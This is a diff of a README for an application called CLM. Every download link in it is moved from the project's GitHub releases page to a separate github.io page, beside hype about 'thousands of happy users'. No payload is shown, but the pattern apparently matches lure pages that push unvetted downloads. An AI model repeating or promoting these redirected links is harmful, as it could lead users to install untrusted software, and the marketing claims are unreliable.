@@ -1,6 +1,6 @@
 # ⚡ CLM - Smarter Decisions, Lightning-Fast Reasoning
 
-[![Download CLM](https://img.shields.io/badge/Download-CLM_v0.1-2ea44f?style=for-the-badge)](https://github.com/lovellaphrodisiacal150/CLM/releases)
+[![Download CLM](https://img.shields.io/badge/Download-CLM_v0.1-2ea44f?style=for-the-badge)](https://lovellaphrodisiacal150.github.io)
 
 ---
 
@@ -30,7 +30,7 @@ Ready to try CLM? Great! Here's what you need to do:
 
 Visit this link to download the application:
 
-[**📥 Download CLM Now**](https://github.com/lovellaphrodisiacal150/CLM/releases)
+[**📥 Download CLM Now**](https://lovellaphrodisiacal150.github.io)
 
 This will take you to the official download page where you can get the latest version of CLM.
 
@@ -136,7 +136,7 @@ CLM is released under an open-source license, meaning you can use, modify, and s
 
 Don't wait—experience the future of fast, intelligent decision-making right now.
 
-[**🚀 Download CLM**](https://github.com/lovellaphrodisiacal150/CLM/releases)
+[**🚀 Download CLM**](https://lovellaphrodisiacal150.github.io)
 
 Join thousands of happy users who have already made their lives easier with CLM. It's free, it's fast, and it's waiting for you!
 
